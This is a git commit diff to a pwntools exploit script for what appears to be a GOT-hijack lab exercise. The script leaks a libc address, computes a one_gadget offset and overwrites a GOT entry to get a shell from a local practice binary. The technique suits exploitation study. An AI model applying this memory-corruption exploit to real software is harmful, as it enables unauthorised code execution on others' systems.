c6cea705c04e1987d4638dcf5c919d2ae44a917b
Lin, Yong Xiang <r888800009@gmail.com>
2023-11-28 14:15:06 +0800

    Update got_hijeck.py

--- dynamic-linking/got_hijack.py
+++ dynamic-linking/got_hijack.py
@@ -5,7 +5,9 @@ context.arch = 'amd64'
 
 elf = ELF('./got_hijack')
 p = process('./got_hijack')
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc_file = "../libc.so.6.md5.5898fac5d2680d0d8fefdadd632b7188"
+libc = ELF(libc_file)
+c = process("./rop-orw", env={'LD_PRELOAD': libc_file})
 #gdb.attach(p, '''''')
 offset = (elf.got['puts'] - elf.symbols['data']) // 8
 print(offset)
@@ -20,7 +22,7 @@ printf_addr = int(p.recvline().strip())
 print(hex(printf_addr))
 libc_base = printf_addr - libc.symbols['__isoc99_scanf']
 
-one_gadget = libc_base + 0xe6c81
+one_gadget = libc_base + 0xe3b01
 p.sendlineafter(':', str(one_gadget))
 p.interactive()
 
